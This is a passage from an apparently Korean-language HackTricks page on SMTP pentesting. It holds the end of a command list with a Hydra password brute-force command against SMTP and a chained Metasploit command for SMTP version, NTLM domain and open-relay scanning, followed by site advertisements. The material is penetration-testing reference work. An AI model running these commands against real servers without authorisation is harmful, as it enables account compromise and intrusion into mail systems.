Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

**취약점 평가 및 침투 테스트를 위한 즉시 사용 가능한 설정**. 20가지 이상의 도구 및 기능을 사용하여 어디서든 전체 펜테스트를 실행하고, 정찰부터 보고서 작성까지 가능합니다. 우리는 펜테스터를 대체하지 않습니다 - 대신, 사용자들이 더 심층적으로 파고들고, 쉘을 열고 즐길 수 있도록 맞춤형 도구, 탐지 및 공격 모듈을 개발합니다.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 PDF 형식의 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나, **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유하세요.**

</details>
